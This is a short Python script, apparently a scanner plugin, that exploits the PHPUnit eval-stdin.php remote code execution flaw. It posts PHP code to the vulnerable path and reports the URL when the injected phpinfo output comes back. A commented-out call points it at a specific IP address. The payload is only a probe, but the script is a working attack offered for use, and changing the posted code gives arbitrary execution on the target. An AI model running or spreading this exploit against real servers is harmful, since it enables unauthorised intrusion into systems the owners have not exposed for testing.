# coding:utf-8

import requests
import re

class Exploit:

    def attack(self, url):
        param = '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        post_data = "<?php phpinfo();"

        response = requests.post(url+param, data=post_data,timeout=5)
        if "phpinfo" in response.content:
            return url
#
# print Exploit().attack("http://39.108.141.103")